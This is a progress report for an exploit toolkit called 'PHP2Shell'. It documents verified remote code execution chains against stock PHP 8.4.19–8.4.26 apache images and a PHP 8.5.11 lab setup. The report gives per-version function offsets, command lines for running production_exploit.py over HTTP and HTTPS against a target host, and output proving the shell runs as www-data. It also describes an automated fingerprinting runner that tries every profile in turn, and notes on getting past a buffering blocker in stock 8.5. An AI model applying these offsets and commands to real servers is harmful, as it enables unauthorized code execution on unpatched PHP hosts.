# PHP2Shell progress

Updated: 2026-10-25

## Verified RCE

### PHP 8.4 stock production, x86-64

`production_exploit.py` runs the A1/B1/A2/B2 chain against official
`php:8.4.19-apache` through `php:8.4.26-apache` images with the stock
`php.ini-production`, ASLR enabled, and no target INI or MPM changes.

| PHP | `zif_system` | `zval_ptr_dtor` | Verification |
|---|---:|---:|---|
| 8.4.19 | `0x4472f0` | `0x63efe0` | RCE, single worker and 150 workers |
| 8.4.20 | `0x447530` | `0x63f9e0` | RCE, single worker |
| 8.4.21 | `0x4623b0` | `0x65afe0` | RCE, single worker |
| 8.4.22 | `0x462d30` | `0x65b9e0` | RCE, single worker |
| 8.4.23 | `0x462d70` | `0x65b9a0` | RCE, single worker |
| 8.4.24 | `0x464530` | `0x65d1e0` | RCE, single worker |
| 8.4.25 | `0x464c70` | `0x65dc60` | RCE, single worker |
| 8.4.26 | `0x465370` | `0x65eb60` | RCE, single worker and 150 workers |

Run:

```bash
python3 production_exploit.py \
    --host 127.0.0.1 --port 1337 --workers 1 \
    --version 8.4.26 --host-proof out/p1
```

The chain pins `--workers - 1` partial POSTs open and uses the remaining
prefork child for all four stages. A1/B1 are chunked; A2/B2 are fixed-length.

### HTTPS

`production_exploit.py` supports TLS for exploit and holder connections:

```bash
python3 production_exploit.py \
    --host target.example --port 443 --https \
    --servername target.example --workers 1 \
    --version 8.4.26 --host-proof out/p1
```

Certificates are verified by default. `--insecure` disables verification for
self-signed labs. `--host-header` overrides the HTTP `Host` header. Verified
over HTTP and over a raw TLS terminator with one and two workers.

### PHP 8.5 lab contract

The published 8.5.11 session chain works with:

```text
memory_limit=8M
post_max_size=64M
output_buffering=0
display_errors=On
one prefork mod_php worker
```

Verified proof:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`session_exploit.py --profile php-8.5.11-bookworm-amd64` uses
`stage1_n=841`, `forge_len=63`, `stage2_t=406`, `stage2_v=16`,
`htdata=0x690d8`, and the carrier stage.

## Stock 8.5.10 / 8.5.11 blocker

The stock production configuration is different:

```text
memory_limit=128M
post_max_size=8M
output_buffering=4096
display_errors=Off
```

The 140 MiB chunked poison reaches the parser under stock and produces the
expected pre-RINIT OOM:

```text
Allowed memory size of 134217728 bytes exhausted
```

However, the stage-1 stale session cookie is not emitted. The critical
configuration difference is `output_buffering=4096`:

| Configuration | Stage-1 cookie |
|---|---|
| empty INI + lab settings (`output_buffering=0`) | 4096-byte stale cookie |
| empty INI + only `output_buffering=4096` | no cookie |
| full production INI | no cookie |
| production INI with buffering disabled | 4096-byte stale cookie |

The target reports:

```text
Session cookie cannot be sent after headers have already been sent
```

Sweeps of `stage1_n` from 0 through 1000 and forge lengths from 47 through 95
did not recover the leak with buffering enabled. Replaying the exact captured
working 8M poison and B1 bodies also failed under the production INI and
succeeded under an empty INI. This rules out boundary and body transcription.

The real-world Delft trace data is consistent with stage 1 being the rare step:
many hosts show startup OOMs, but very few show a stale read.

## Other findings

- `production_exploit.py` is independent of Exploit-DB 52704. It uses stock
  production, worker pinning, chunked A1/B1, a combined heap/libphp leak, and a
  reference spray. `session_exploit.py` is the EDb-style port.
- 8.5.10 and 8.5.11 session profiles exist; 8.5.11 lab RCE is verified.
- 8.5.11 stock offsets: `zif_system=0x5996e0`, `zval_ptr_dtor=0x7b47a0`.
- 8.5.10 stock offsets: `zif_system=0x598d60`, `zval_ptr_dtor=0x7b3860`.
- 8.4.27, 8.5.12, 8.3.36 and 8.2.35 are fixed and are rejected.
- The aarch64 production offsets are present but are not verified on ARM.

## Response-only proof

Both exploit chains can prove execution without a target file:

- `production_exploit.py --response-proof` appends a marker and
  `seq 1 5000` so the B2 output exceeds the stock 4096-byte output buffer, then
  parses the B2 response.
- `session_exploit.py --response-proof` uses the 14-byte command
  `id;seq 1 5000` and checks the stage-3 response for `uid=`.
- `fingerprint.py --response-proof` forwards the mode to either chain.

Verified against stock 8.4.26 mod_php (no `/out` file created) and the 8.5.11
lab session profile. Response:

```text
PROOF: P2S_RCE
UID: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Automated runner

`fingerprint.py` now includes the stock-production 8.4.19-8.4.26 profiles.
The priority order is:

1. exact stock-production version
2. nearest other stock-production versions
3. existing session-chain profiles

Use `--run --try-all` to try the complete list. `--fallback` applies
`--max-attempts`. The production chain uses `--workers` or
`--production-workers`; if neither is supplied it defaults to one worker and
prints a warning.

Verified automation:

- 8.4.26 target: exact `php-8.4.26-prod-x86_64`, proof
- 8.4.25 target: exact `php-8.4.25-prod-x86_64`, proof
- HTTPS production command builder inherits `--insecure` and SNI from the URL

## Next work

1. Find an output-buffering-independent leak for stock 8.5, or document
   `output_buffering=0` as a required exploit condition.
2. Verify the production worker count behavior on a 150-worker target through
   the fingerprint runner.
